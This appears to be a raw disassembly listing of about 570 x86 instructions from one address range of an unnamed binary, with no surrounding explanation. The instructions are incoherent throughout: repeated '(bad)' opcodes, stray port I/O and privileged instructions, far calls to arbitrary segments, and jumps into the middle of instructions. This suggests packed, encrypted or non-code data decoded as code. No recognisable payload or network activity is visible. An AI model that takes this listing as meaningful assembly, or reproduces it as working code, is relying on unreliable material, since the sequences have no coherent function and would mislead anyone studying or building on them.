  40a34b:	xor    DWORD PTR [edi-0x552464d5],ebx
  40a351:	sbb    BYTE PTR [edi],0x4a
  40a354:	inc    esi
  40a355:	imul   esp,eax,0x42b7e162
  40a35b:	xchg   edx,eax
  40a35c:	push   esp
  40a35d:	sti    
  40a35e:	push   ss
  40a35f:	pop    esp
  40a360:	inc    esp
  40a361:	sub    eax,DWORD PTR [edi-0x28520d67]
  40a367:	mov    ds:0xee34b338,al
  40a36c:	mov    ah,0x3
  40a36e:	lods   al,BYTE PTR ds:[esi]
  40a36f:	push   edx
  40a370:	repz push 0xffffffc2
  40a373:	inc    ebx
  40a374:	pop    ds
  40a375:	inc    esi
  40a376:	mov    ebp,0x4c4eb988
  40a37b:	cmp    BYTE PTR [edi],dh
  40a37d:	jno    0x40a3d2
  40a37f:	imul   esp,edx,0xe05eb0d0
  40a385:	push   edi
  40a386:	mov    cl,0x4
  40a388:	mov    al,dh
  40a38a:	adc    ch,dl
  40a38c:	repnz pop ebx
  40a38e:	adc    BYTE PTR [eax],ah
  40a390:	inc    BYTE PTR [eax+0x664ca2ec]
  40a396:	add    edi,esi
  40a398:	(bad)  
  40a399:	adc    DWORD PTR [esi+0x796f0709],eax
  40a39f:	or     edi,ecx
  40a3a1:	mov    al,ds:0x84df6a05
  40a3a6:	(bad)
  40a3ab:	dec    edi
  40a3ac:	test   BYTE PTR [eax-0x74],ah
  40a3af:	mov    cl,0x16
  40a3b1:	cdq    
  40a3b2:	mov    ebx,0x2079fcd
  40a3b7:	cmp    eax,0xe2d6b950
  40a3bc:	int    0xc8
  40a3be:	and    dh,BYTE PTR [ecx]
  40a3c0:	jle    0x40a3c9
  40a3c2:	mov    eax,ds:0xb129a3aa
  40a3c7:	sbb    al,BYTE PTR ds:[eax]
  40a3ca:	pushf  
  40a3cb:	into   
  40a3cc:	xor    edi,edi
  40a3ce:	rol    esi,0xb8
  40a3d1:	xchg   edi,eax
  40a3d2:	in     al,0xc9
  40a3d4:	outs   dx,DWORD PTR ds:[esi]
  40a3d5:	mov    ebp,0x4d66bd2
  40a3da:	fadd   QWORD PTR [esi]
  40a3dc:	retf   
  40a3dd:	pop    bx
  40a3df:	loop   0x40a3c2
  40a3e1:	loope  0x40a42f
  40a3e3:	push   ecx
  40a3e4:	xchg   ebx,eax
  40a3e5:	out    dx,eax
  40a3e6:	push   edx
  40a3e7:	getsec 
  40a3e9:	mul    BYTE PTR [esi-0x3cdcfe59]
  40a3ef:	pop    DWORD PTR [esi+edx*8-0x4e]
  40a3f3:	and    eax,0x2c49a944
  40a3f8:	push   esp
  40a3f9:	int    0xb2
  40a3fb:	mov    esi,0x4aaf9428
  40a400:	fsubp  st(0),st
  40a402:	cmp    BYTE PTR [eax+ebp*8-0x1611b38e],bl
  40a409:	mov    ebx,eax
  40a40b:	sub    edx,edx
  40a40d:	icebp  
  40a40e:	push   0xfa0ff1c
  40a413:	or     BYTE PTR [eax],bl
  40a415:	into   
  40a416:	cmp    DWORD PTR [esi+ecx*1+0x9],0x6a
  40a41b:	cmp    BYTE PTR [edi+0x42d5a06e],ch
  40a421:	mov    esi,esp
  40a423:	dec    ecx
  40a424:	adc    al,0xeb
  40a426:	mov    edi,0xaf710b04
  40a42b:	repz or eax,0xb6064807
  40a431:	ror    esp,1
  40a433:	adc    eax,0x7587b6d2
  40a438:	imul   ecx,DWORD PTR [ebp+0x643c4379],0x5d9b7dc4
  40a442:	shl    BYTE PTR [eax+ecx*1-0x481a7333],0xfa
  40a44a:	pop    ebp
  40a44b:	xchg   ebp,eax
  40a44c:	jno    0x40a46c
  40a44e:	call   0xbe842a63
  40a453:	out    0x80,eax
  40a455:	mov    ss,WORD PTR [eax-0x66a719d8]
  40a45b:	or     DWORD PTR [ebx],ebp
  40a45d:	mov    edx,0x3badf58
  40a462:	fiadd  WORD PTR [esi-0x59]
  40a465:	cmc    
  40a466:	xor    al,0x8f
  40a468:	fwait
  40a469:	xchg   esi,eax
  40a46a:	mul    BYTE PTR [ebx]
  40a46c:	mov    WORD PTR [edx-0x4930432f],es
  40a472:	mov    ebx,0xbc15296c
  40a477:	add    eax,0x35cc2a80
  40a47c:	ds jae 0x40a42d
  40a47f:	xor    ecx,0xcf17f621
  40a485:	int    0x60
  40a487:	push   cs
  40a488:	adc    DWORD PTR [edx+0x56],ebx
  40a48b:	xor    BYTE PTR [eax+0x7b37978f],0xde
  40a492:	pop    esp
  40a493:	sub    eax,0xe91ee0ab
  40a498:	jge    0x40a4e9
  40a49a:	aam    0x8e
  40a49c:	add    eax,0x154dcf78
  40a4a1:	std    
  40a4a2:	jge    0x40a4d7
  40a4a4:	data16 aaa 
  40a4a6:	out    dx,eax
  40a4a7:	fld    DWORD PTR [ecx+ebp*1+0x502ec35c]
  40a4ae:	inc    ecx
  40a4af:	sbb    al,0x10
  40a4b1:	jmp    0x1d655ea0
  40a4b6:	dec    ecx
  40a4b7:	cld    
  40a4b8:	jl     0x40a477
  40a4ba:	jo     0x40a4e6
  40a4bc:	adc    DWORD PTR [ecx],0x35
  40a4bf:	push   cs
  40a4c0:	mov    edx,0x5f7b0ff7
  40a4c5:	push   ebp
  40a4c6:	and    DWORD PTR [esi-0xe9df6f2],eax
  40a4cc:	xlat   BYTE PTR ds:[ebx]
  40a4cd:	lds    esi,FWORD PTR [edx]
  40a4cf:	pop    edi
  40a4d0:	or     dh,ch
  40a4d2:	test   al,ah
  40a4d4:	aas    
  40a4d5:	mov    ebp,0x35cf8abd
  40a4db:	lods   eax,DWORD PTR ds:[esi]
  40a4dc:	neg    BYTE PTR [ebx]
  40a4de:	fucomi st,st(1)
  40a4e0:	pop    edi
  40a4e1:	addr16 mov edi,0xb91c9e86
  40a4e7:	inc    esp
  40a4e8:	sbb    ch,bh
  40a4ea:	das    
  40a4eb:	and    ebx,DWORD PTR [ebp-0x23ed4670]
  40a4f1:	jnp    0x40a51d
  40a4f3:	adc    eax,0x6a5faab
  40a4f8:	cmp    edx,DWORD PTR [ebp+0x28dc780b]
  40a4fe:	dec    eax
  40a4ff:	xor    dh,cl
  40a501:	add    BYTE PTR [esi-0x69238414],dl
  40a507:	mov    gs,WORD PTR [ebx]
  40a509:	fstp   st(3)
  40a50b:	pop    eax
  40a50c:	retf   
  40a50d:	montmul (bad)
  40a50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a50f:	lds    esi,FWORD PTR [ebp-0x3d3a8d29]
  40a515:	add    eax,0x8f26c18
  40a51a:	pusha  
  40a51b:	push   esi
  40a51c:	retf   
  40a51d:	arpl   WORD PTR [esi+0x5a575d59],si
  40a523:	xor    BYTE PTR es:[ecx+0x6d5a2c86],cl
  40a52a:	not    DWORD PTR [ecx+0x52]
  40a52d:	adc    al,0x23
  40a52f:	push   ds
  40a530:	cmp    ch,BYTE PTR [ecx+0x2949e8bc]
  40a536:	inc    edi
  40a537:	sbb    ebx,DWORD PTR [ecx]
  40a539:	push   0xfffffff2
  40a53b:	aam    0xd4
  40a53d:	stos   BYTE PTR es:[edi],al
  40a53e:	dec    edi
  40a53f:	test   eax,0xaa2470c4
  40a544:	sti    
  40a545:	jb     0x40a584
  40a547:	jecxz  0x40a567
  40a549:	or     ebx,DWORD PTR [ebx-0x5bc9871f]
  40a54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a551:	ja     0x40a50c
  40a553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a554:	ss cmp al,0xae
  40a557:	dec    edi
  40a558:	ins    BYTE PTR es:[edi],dx
  40a559:	push   esi
  40a55a:	in     al,0x14
  40a55c:	add    DWORD PTR [edi],ebx
  40a55e:	add    BYTE PTR [edx-0x33f8f2f3],dh
  40a564:	stc    
  40a565:	sbb    eax,0xc883a8f9
  40a56a:	pop    ebp
  40a56b:	call   0xb3f0:0x2f5f7b90
  40a572:	adc    BYTE PTR [ebx+0x71],0x94
  40a576:	out    dx,eax
  40a577:	popf   
  40a578:	popf   
  40a579:	retf   
  40a57a:	mov    esp,0x679122c7
  40a57f:	in     eax,0xb
  40a581:	inc    eax
  40a583:	xchg   ebp,eax
  40a584:	pop    edx
  40a585:	cli    
  40a586:	push   0xcded0e1
  40a58b:	add    eax,0x6c9d09dc
  40a590:	sbb    esp,DWORD PTR [esi+0x2101896b]
  40a596:	lea    ecx,[edx]
  40a598:	push   esp
  40a599:	pop    ebx
  40a59a:	retf   
  40a59b:	pusha  
  40a59c:	out    0xce,eax
  40a59e:	jl     0x40a560
  40a5a0:	mov    ch,0x1a
  40a5a2:	add    al,0xaa
  40a5a4:	fnsave [ebx]
  40a5a6:	adc    al,0x28
  40a5a8:	ss push 0xffffff8e
  40a5ab:	xor    DWORD PTR [edi],esp
  40a5ad:	shl    BYTE PTR [eax-0x72],cl
  40a5b0:	xchg   edx,eax
  40a5b1:	sbb    edx,DWORD PTR ds:0xecea45dd
  40a5b7:	inc    eax
  40a5b8:	xchg   ebx,eax
  40a5b9:	push   ds
  40a5ba:	inc    ebx
  40a5bb:	xchg   BYTE PTR [esp+ecx*2+0x42],ah
  40a5bf:	bound  eax,QWORD PTR [edi]
  40a5c1:	bound  eax,QWORD PTR fs:[bx]
  40a5c5:	shl    DWORD PTR [ecx+0x31],1
  40a5c8:	jno    0x40a5f4
  40a5ca:	call   0xac45:0xe2253831
  40a5d1:	mov    bh,0x67
  40a5d3:	aas    
  40a5d4:	and    eax,0xa92a60fe
  40a5d9:	adc    BYTE PTR [ebx+0xd258ea1],al
  40a5df:	mov    ecx,0x9f5b8216
  40a5e4:	sub    ch,BYTE PTR [ebp-0x9409c43]
  40a5ea:	lods   eax,DWORD PTR ds:[esi]
  40a5eb:	adc    BYTE PTR [edx+0x17],ch
  40a5ee:	or     cl,BYTE PTR [eax-0x54]
  40a5f1:	and    DWORD PTR [ebx-0xad57085],ebp
  40a5f7:	fcmovnbe st,st(7)
  40a5f9:	test   esi,ebx
  40a5fb:	(bad)
  40a5fe:	mov    fs,ebx
  40a600:	test   eax,0xcd9e277f
  40a605:	loopne 0x40a5c4
  40a607:	pop    esp
  40a608:	xchg   edx,eax
  40a609:	xchg   BYTE PTR [edi-0x129858ec],bh
  40a60f:	inc    esp
  40a610:	push   0xfffffff3
  40a612:	out    0xc6,al
  40a614:	js     0x40a68e
  40a616:	xor    edi,DWORD PTR [edi+0x4824c0f9]
  40a61c:	into   
  40a61d:	ja     0x40a5d5
  40a61f:	icebp  
  40a620:	or     al,ah
  40a622:	mov    eax,ds:0x6394fcf8
  40a627:	xchg   ecx,eax
  40a628:	test   eax,0xc37ebd39
  40a62d:	push   cs
  40a62e:	in     al,0xd7
  40a630:	mov    esp,0x9a44caa3
  40a635:	adc    eax,DWORD PTR [esi+eiz*1-0x6d960a50]
  40a63c:	or     eax,0xea9dd602
  40a641:	jnp    0x40a5c6
  40a643:	mov    ebx,0x9dab1f5d
  40a648:	jp     0x40a678
  40a64a:	sub    DWORD PTR ss:[ecx+0x55cc7c36],ebx
  40a651:	or     BYTE PTR ds:0xfea37969,0xb4
  40a658:	cwde   
  40a659:	inc    ebx
  40a65a:	std    
  40a65b:	lods   eax,DWORD PTR ds:[esi]
  40a65c:	dec    BYTE PTR [edi+0x2c]
  40a65f:	or     al,0xd8
  40a661:	adc    cl,BYTE PTR [ebx]
  40a663:	push   cs
  40a664:	inc    ebx
  40a665:	sbb    DWORD PTR [ebx-0x2291746a],ebx
  40a66b:	xchg   edx,eax
  40a66c:	outs   dx,DWORD PTR ds:[esi]
  40a66d:	mov    esp,0x92d68093
  40a672:	lahf   
  40a673:	add    BYTE PTR [edx],dh
  40a675:	jmp    0x40a5f8
  40a677:	cmp    eax,0xe2f12f9c
  40a67c:	push   edx
  40a67d:	inc    sp
  40a67f:	cmp    bh,BYTE PTR [edi]
  40a681:	(bad)  
  40a683:	data16 aaa 
  40a685:	mov    edx,0x6c19962d
  40a68a:	push   ebp
  40a68b:	loope  0x40a704
  40a68d:	jmp    0x40b44344
  40a692:	enter  0x4c67,0x3e
  40a696:	sub    eax,0x1e62ab67
  40a69b:	lahf   
  40a69c:	lods   eax,DWORD PTR ds:[esi]
  40a69d:	sahf   
  40a69e:	jecxz  0x40a6ff
  40a6a0:	jnp    0x40a717
  40a6a2:	adc    al,0xf0
  40a6a4:	jl     0x40a6a4
  40a6a6:	mov    dl,0xa
  40a6a8:	mov    ebx,0xb39cc373
  40a6ad:	sbb    dl,dh
  40a6af:	pop    edi
  40a6b0:	lods   al,BYTE PTR ds:[esi]
  40a6b1:	jle    0x40a6dc
  40a6b3:	imul   ebx,DWORD PTR [ebx-0x1caa096f],0x58b08a8
  40a6bd:	sar    BYTE PTR [ecx+0x31],1
  40a6c0:	pop    eax
  40a6c1:	fadd   st,st(5)
  40a6c3:	rcr    DWORD PTR [esi],cl
  40a6c5:	pop    es
  40a6c6:	cs pop ds
  40a6c8:	idiv   DWORD PTR [edi+ecx*8-0x64]
  40a6cc:	and    DWORD PTR ds:0x5712e43e,esp
  40a6d2:	mov    es:0x23c19f4f,al
  40a6d8:	xor    eax,DWORD PTR [ecx-0x735d0a65]
  40a6de:	lahf   
  40a6df:	add    cl,BYTE PTR ds:0xa089bac0
  40a6e5:	mov    WORD PTR [edi],?
  40a6e7:	lea    eax,[ecx+0x7ed67c4c]
  40a6ed:	in     al,0x4a
  40a6ef:	dec    edx
  40a6f0:	jp     0x40a698
  40a6f2:	dec    edi
  40a6f3:	xlat   BYTE PTR ds:[ebx]
  40a6f4:	sub    DWORD PTR [ebx-0x78],ebp
  40a6f7:	or     al,0x35
  40a6f9:	popf   
  40a6fa:	sub    eax,0x4e241c76
  40a6ff:	dec    esp
  40a700:	(bad)  [edx+0x30]
  40a703:	rcr    BYTE PTR [edx+eax*1-0x571d9a6e],0x5c
  40a70b:	xchg   esp,eax
  40a70c:	pop    ss
  40a70d:	cmc    
  40a70e:	pop    edx
  40a70f:	out    dx,al
  40a710:	xchg   esi,eax
  40a711:	sub    DWORD PTR [esi+0x40],edx
  40a714:	lahf   
  40a715:	mov    ebx,0x5342b2d9
  40a71a:	or     DWORD PTR [edx+0x27ab4bc0],esi
  40a720:	rcl    al,0x68
  40a723:	ror    BYTE PTR [ebp+0x64],cl
  40a726:	scas   eax,DWORD PTR es:[edi]
  40a727:	je     0x40a74a
  40a729:	sahf   
  40a72a:	jp     0x40a702
  40a72c:	shl    DWORD PTR [ebx+0x5b],1
  40a72f:	hlt    
  40a730:	xlat   BYTE PTR ds:[ebx]
  40a731:	push   es
  40a732:	xor    DWORD PTR [esp+ebp*1-0x40a5de93],ebp
  40a739:	lods   eax,DWORD PTR ds:[esi]
  40a73a:	add    al,0xd2
  40a73c:	cs push cs
  40a73e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a73f:	mov    bh,0x78
  40a741:	dec    ecx
  40a742:	in     al,dx
  40a743:	adc    al,0x21
  40a745:	(bad)  
  40a746:	gs cdq 
  40a748:	cmp    dh,BYTE PTR [edi-0x4ee8d6df]
  40a74e:	dec    ebp
  40a74f:	nop
  40a750:	sbb    al,0xeb
  40a752:	push   ebx
  40a753:	push   eax
  40a754:	jmp    0x40a726
  40a756:	addr16 cdq 
  40a758:	mov    eax,ds:0x75286b7b
  40a75d:	push   edx
  40a75e:	int3   
  40a75f:	add    al,0x1
  40a761:	push   esp
  40a762:	(bad)  
  40a765:	fcmovne st,st(5)
  40a767:	inc    esp
  40a768:	xchg   esi,eax
  40a769:	clc    
  40a76a:	lock ret 0x1334
  40a76e:	cld    
  40a76f:	js     0x40a6f2
  40a771:	mov    bh,0xb3
  40a773:	test   al,0xc5
  40a775:	hlt    
  40a776:	add    eax,DWORD PTR [edx+0x6c5314f3]
  40a77c:	jge    0x40a7d3
  40a77e:	push   esi
  40a77f:	jg     0x40a7bf
  40a781:	mov    eax,0x706f7cdd
  40a786:	jge    0x40a721
  40a788:	aas    
  40a789:	call   0x5a30:0x6e4e317f
  40a790:	push   ecx
  40a791:	jmp    0x6dc0:0x7bb666c7
  40a798:	inc    ebp
  40a799:	sbb    al,0x58
  40a79b:	ja     0x40a812
  40a79d:	mov    ebx,ss
  40a79f:	add    eax,0xadeb7de5
  40a7a4:	xor    eax,0xe40d7d0
  40a7a9:	cs pop ds
  40a7ab:	mov    bl,0x6f
  40a7ad:	push   ds
  40a7ae:	sbb    BYTE PTR [esi-0x51],0xcd
  40a7b2:	in     eax,dx
  40a7b3:	jmp    0x40a7f4
  40a7b5:	lds    edx,FWORD PTR [esi-0x66]
  40a7b8:	(bad)  
  40a7ba:	cmp    BYTE PTR [edi-0x5cc4e14e],bl
  40a7c0:	sbb    eax,0xdd8d90b0
  40a7c5:	repz aad 0x7f
  40a7c8:	jo     0x40a7d4
  40a7ca:	add    DWORD PTR [ebp+0x59],ebp
  40a7cd:	sub    ebx,ebx
  40a7cf:	cld    
  40a7d0:	call   0xb740:0x1792a797
  40a7d7:	xchg   ebx,eax
  40a7d8:	shl    BYTE PTR [esi],cl
  40a7da:	mov    ecx,0x58f67a27
  40a7df:	jmp    0x9837:0x48f31ede
  40a7e6:	or     BYTE PTR [esi+0x9b311e2],0x15
  40a7ed:	xchg   ecx,eax
  40a7ee:	inc    edi
  40a7ef:	daa    
  40a7f0:	data16 clc 
  40a7f2:	(bad)  
  40a7f3:	ret    0x8545
  40a7f6:	shl    edx,1
  40a7f8:	xor    DWORD PTR [ebx],esp
  40a7fa:	xchg   DWORD PTR [ebx],esi
  40a7fc:	arpl   bx,dx
  40a7fe:	fwait
  40a7ff:	idiv   DWORD PTR [ecx]
  40a801:	aaa    
  40a802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a803:	cmp    al,0xe0
  40a805:	dec    ebp
  40a806:	dec    eax
  40a807:	dec    eax
  40a808:	xchg   BYTE PTR [eax-0x48],cl
  40a80b:	mov    ecx,0x45776cbe
  40a810:	pop    ebx
  40a811:	dec    esp
  40a812:	add    al,0x70
  40a814:	into   
  40a815:	sub    BYTE PTR [edi+0x7a3097f0],0x85
  40a81c:	fst    DWORD PTR [edi]
  40a81e:	push   eax
  40a81f:	pop    ss
  40a820:	sub    ecx,DWORD PTR [esi]
  40a822:	outs   dx,BYTE PTR ds:[esi]
  40a823:	sbb    DWORD PTR [ebp-0x5b8d7c21],ebx
  40a829:	add    bh,ch
  40a82b:	jbe    0x40a887
  40a82d:	aas    
  40a82e:	pop    edi
  40a82f:	mov    eax,DWORD PTR [edi]
  40a831:	jb     0x40a7b5
  40a833:	pusha  
  40a834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a835:	adc    esp,ebx
  40a837:	inc    ebp
  40a838:	dec    ebp
  40a839:	sbb    al,0x73
  40a83b:	dec    esi
  40a83c:	dec    ecx
  40a83d:	popa   
  40a83e:	fld    st(4)
  40a840:	push   ebx
  40a841:	popa   
  40a842:	jb     0x40a8c1
  40a844:	outs   dx,DWORD PTR ds:[esi]
  40a845:	pushf  
  40a846:	js     0x40a821
  40a848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a849:	nop
  40a84a:	(bad)  
  40a84b:	pop    edi
  40a84c:	lea    ebp,[ecx+0x3d3c94a4]
  40a852:	jmp    0x4836bde4
  40a857:	out    dx,al
  40a858:	out    0xff,al
  40a85a:	imul   esp,eax,0xffffffb5
  40a85d:	retf   
  40a85e:	inc    ebx
  40a85f:	je     0x40a8b7
  40a861:	inc    esi
  40a862:	sti    
  40a863:	clc    
  40a864:	inc    edx
  40a865:	jle    0x40a883
  40a867:	int    0xbf
  40a869:	repnz fimul DWORD PTR [ebp+0x37]
  40a86d:	hlt    
  40a86e:	test   al,0x1f
  40a870:	jnp    0x40a8e8
  40a872:	push   edx
  40a873:	lock and eax,0x85bed6b0
  40a879:	inc    ecx
  40a87a:	rcl    DWORD PTR [esp+eiz*2-0x5b40efa],1
  40a881:	or     cl,dl
  40a883:	imul   DWORD PTR [edx+0x1c]
  40a886:	scas   eax,DWORD PTR es:[edi]
  40a887:	fdiv   st(2),st
  40a889:	xor    BYTE PTR [ebx-0x4e2ecf7b],ch
  40a88f:	fsub   QWORD PTR [eax]
  40a891:	jl     0x40a861
  40a893:	mov    al,0x29
  40a895:	pop    esi
  40a896:	pop    ds
  40a897:	fiadd  DWORD PTR [ebx+ecx*1+0x1f]
  40a89b:	xor    ch,BYTE PTR [eax]
  40a89d:	or     dh,al
  40a89f:	xchg   edx,eax
  40a8a0:	dec    ebx
  40a8a1:	test   eax,0xa3b0fa7e
  40a8a6:	jmp    0x40a875
  40a8a8:	jge    0x40a8b3
  40a8aa:	cmp    esi,DWORD PTR [ecx+0x248de481]
  40a8b0:	push   ds
  40a8b1:	and    BYTE PTR [ebx+0x1c],cl
  40a8b4:	adc    BYTE PTR ds:0xfe9da385,0x4e
  40a8bb:	xor    eax,0xe50a08ec
  40a8c0:	mov    al,0x0
  40a8c2:	dec    ecx
  40a8c3:	and    DWORD PTR [eax+0x7f91dd9b],eax
  40a8c9:	clc    
  40a8ca:	mov    eax,0x2ad04412
  40a8cf:	push   eax
  40a8d0:	(bad)  
  40a8d1:	fisttp WORD PTR [esi]
  40a8d3:	not    DWORD PTR [esi]
  40a8d5:	jecxz  0x40a8ba
  40a8d7:	dec    ecx
  40a8d8:	sub    ecx,DWORD PTR [edi+ecx*4+0x4c]
  40a8dc:	loop   0x40a86b
  40a8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8df:	pop    edi
  40a8e0:	push   edi
  40a8e1:	or     al,0x19
  40a8e3:	mov    ds:0x23f116e0,al
  40a8e8:	jae    0x40a95d
  40a8ea:	dec    esp
  40a8eb:	xchg   al,bh
  40a8ed:	js     0x40a8d4
  40a8ef:	xor    bh,dl
  40a8f1:	out    dx,eax
  40a8f2:	test   bl,dl
  40a8f4:	cmp    ah,BYTE PTR [esi+0x1740a5ec]
  40a8fa:	nop
  40a8fb:	push   ds
  40a8fc:	loop   0x40a974
  40a8fe:	ja     0x40a90a
  40a900:	and    al,0x1d
  40a902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a903:	dec    edx
  40a904:	call   0x66c4:0x29098d49
  40a90b:	test   DWORD PTR [ebp+ecx*2+0x6abd4779],esp
  40a912:	pop    esp
  40a913:	rcl    BYTE PTR [esi],1
  40a915:	sahf   
  40a916:	stos   BYTE PTR es:[edi],al
  40a917:	fild   WORD PTR [ebp-0x5d]
  40a91a:	xchg   ebx,eax
  40a91b:	mov    ds:0x3d3c5c4d,al
  40a920:	std    
  40a921:	(bad)  
  40a922:	sbb    DWORD PTR [ecx+eax*2-0xde777b9],ebx
  40a929:	and    eax,0x4242724c
  40a92e:	inc    edi
  40a92f:	pop    esp
  40a930:	sub    al,0x77
  40a932:	test   eax,0xf06c990c
  40a937:	push   es
  40a938:	inc    ebp
  40a939:	stc    
  40a93a:	in     al,0xfe
  40a93c:	add    eax,0x321ffae5
  40a941:	mov    ebp,0x12d69d9d
  40a946:	adc    ah,BYTE PTR [ebp+0x2b7ecaf5]
  40a94c:	int    0xd3
  40a94e:	icebp  
  40a94f:	sub    ecx,ecx
  40a951:	scas   eax,DWORD PTR es:[edi]
  40a952:	test   al,0x37
  40a954:	xchg   BYTE PTR [edx+edi*4-0x69dada84],dl
  40a95b:	pop    eax
  40a95c:	cmp    BYTE PTR [edi],ch
  40a95e:	sub    DWORD PTR [edi-0x6e],ecx
  40a961:	pop    esp
  40a962:	cmp    edx,DWORD PTR [ebp+0x62bcdefa]
  40a968:	popf   
  40a969:	popa   
  40a96a:	inc    ebp
  40a96b:	enter  0x815d,0x4e
  40a96f:	add    cl,BYTE PTR [ebp-0x36b05afd]
  40a975:	clc    
  40a976:	lds    esi,FWORD PTR [ebx]
  40a978:	mov    dh,0x48
  40a97a:	push   ebx
  40a97b:	cmp    DWORD PTR [ecx],edx
  40a97d:	arpl   si,bx
  40a97f:	sar    DWORD PTR [ebp-0x6d800e3b],1
  40a985:	inc    ecx
  40a986:	mov    al,0x73
  40a988:	std    
  40a989:	loope  0x40a9c4
  40a98b:	mov    ebp,edi
  40a98d:	popf   
  40a98e:	adc    al,0x28
  40a990:	retf   0xb0c3
  40a993:	jle    0x40a95b
  40a995:	add    BYTE PTR [esi],ch
  40a997:	xchg   DWORD PTR [esi+0x73],eax
  40a99a:	dec    ebx
  40a99b:	adc    al,0xd3
  40a99d:	xchg   edi,eax
  40a99e:	(bad)  
  40a9a0:	mov    eax,0x23afa3ae
  40a9a5:	mov    ecx,0xcce3350a
  40a9aa:	lods   eax,DWORD PTR ds:[esi]
  40a9ab:	icebp  
  40a9ac:	inc    edi
  40a9ad:	dec    esp
  40a9ae:	jecxz  0x40a988
  40a9b0:	dec    esp
  40a9b1:	fnstenv [edx-0x5ab36bca]
  40a9b7:	outs   dx,BYTE PTR ds:[esi]
  40a9b8:	lds    edx,FWORD PTR [edi]
  40a9ba:	es push edx
  40a9bc:	retf   
  40a9bd:	nop
  40a9be:	inc    ebx
  40a9bf:	xlat   BYTE PTR ds:[ebx]
  40a9c0:	scas   eax,DWORD PTR es:[edi]
  40a9c1:	ins    BYTE PTR es:[edi],dx
  40a9c2:	xchg   edx,eax
  40a9c3:	xlat   BYTE PTR ds:[ebx]
  40a9c4:	xor    BYTE PTR [esi+0x17f8bc81],bl
  40a9ca:	cmp    bl,BYTE PTR [edi-0x74]
  40a9cd:	cld    
  40a9ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9cf:	add    al,0x18
  40a9d1:	jp     0x40a9a6
  40a9d3:	sub    dl,BYTE PTR fs:0x576882f
  40a9da:	add    eax,0x25202a08
  40a9df:	xor    esp,eax
  40a9e1:	xor    DWORD PTR [ecx+0x38],ebp
  40a9e4:	xcrypt-cbc (bad)
  40a9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e6:	adc    ch,BYTE PTR [edi+0x6d]
  40a9e9:	iret   
  40a9ea:	inc    eax
  40a9eb:	call   edi
  40a9ed:	mov    al,0xe3
  40a9ef:	and    al,0x11
  40a9f1:	cdq    
  40a9f2:	dec    ebx
  40a9f3:	scas   al,BYTE PTR es:[edi]
  40a9f4:	mov    ds:0x85ee7437,eax
  40a9f9:	je     0x40a9e7
  40a9fb:	and    ecx,DWORD PTR [ebx]
  40a9fd:	pop    es
  40a9fe:	inc    ebp
  40a9ff:	fs (bad) 
  40aa01:	out    0x5e,al
  40aa03:	imul   ecx,DWORD PTR [edx-0x5e39bd2],0x89b18c63
  40aa0d:	cli    
  40aa0e:	mov    ecx,0x9ba78675
  40aa13:	(bad)  
  40aa14:	fadd   DWORD PTR [edi+0x3a]
  40aa17:	push   eax
  40aa18:	repnz popa 
  40aa1a:	pop    ebp
  40aa1b:	jmp    0x40aa11
  40aa1d:	sub    al,0x75
  40aa1f:	cmp    ebx,edx
  40aa21:	stos   BYTE PTR es:[edi],al
  40aa22:	lock and DWORD PTR [edx-0x6e6b309d],edx
  40aa29:	pop    edx
  40aa2a:	nop
  40aa2b:	shl    BYTE PTR [ecx],1
  40aa2d:	dec    esp
  40aa2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2f:	arpl   WORD PTR [ebx+eax*1-0x2e6c9630],bp
  40aa36:	fmul   QWORD PTR [ebp+0x78a0ec4d]
  40aa3c:	dec    ecx
  40aa3d:	retf   0x4a5a
  40aa40:	enter  0x3d,0x3e
  40aa44:	and    DWORD PTR [edx-0x62],edx
  40aa47:	(bad)  
  40aa48:	xchg   esp,eax
  40aa49:	mov    dh,0x6f
  40aa4b:	cwde   
  40aa4c:	repnz pop ss
  40aa4e:	icebp  
  40aa4f:	sbb    bh,bl
  40aa51:	scas   al,BYTE PTR es:[edi]
  40aa52:	jne    0x40a9ed
  40aa54:	jo     0x40a9e1
  40aa56:	cld    
  40aa57:	inc    edx
  40aa59:	cmp    eax,0x439b53e6
  40aa5e:	enter  0x97ad,0x1
  40aa62:	cmp    bl,BYTE PTR [ebx+0x31]
  40aa65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa66:	ja     0x40aa18
  40aa68:	mov    ch,BYTE PTR [esi-0x56]
  40aa6b:	cmp    eax,0xa9febddd
  40aa70:	aam    0x63
  40aa72:	daa    
  40aa73:	dec    edx
  40aa74:	xchg   ebp,eax
  40aa75:	out    dx,al
  40aa76:	gs xchg esp,eax
  40aa78:	es mov cl,0xde
  40aa7b:	inc    ecx
  40aa7c:	test   al,0x2b
  40aa7e:	fsubp  st(6),st
  40aa80:	sub    al,0x8c
  40aa82:	leave  
  40aa83:	or     eax,0xd355893b
  40aa88:	test   bh,bl
  40aa8a:	or     DWORD PTR [eax],ebx
  40aa8c:	jge    0x40aa41
  40aa8e:	xor    eax,0x5c6b2f4
  40aa93:	and    ah,BYTE PTR [ebx]
  40aa95:	aad    0xc8
  40aa97:	jno    0x40aabc
  40aa99:	add    al,0x41
  40aa9b:	dec    esi
  40aa9c:	fcomi  st,st(7)
  40aa9e:	dec    ecx
  40aa9f:	xor    cl,BYTE PTR [ebx]
  40aaa1:	or     al,0x8a
  40aaa3:	mov    eax,0x1ee12a58
  40aaa8:	lock inc ebx
  40aaaa:	push   eax
  40aaab:	push   ss
  40aaac:	gs ds (bad) 
  40aaaf:	outs   dx,DWORD PTR ds:[esi]
  40aab0:	mov    ch,ch
  40aab2:	cmp    bl,BYTE PTR [edi+0x3e]
  40aab5:	retf   0xf542
  40aab8:	sar    cl,1
  40aaba:	mov    al,ds:0xad692954
  40aabf:	push   esi
  40aac0:	adc    al,0xd7
  40aac2:	mov    eax,0x77c2f8de
  40aac7:	or     ebx,edx
  40aac9:	scas   eax,DWORD PTR es:[edi]
  40aaca:	(bad)  
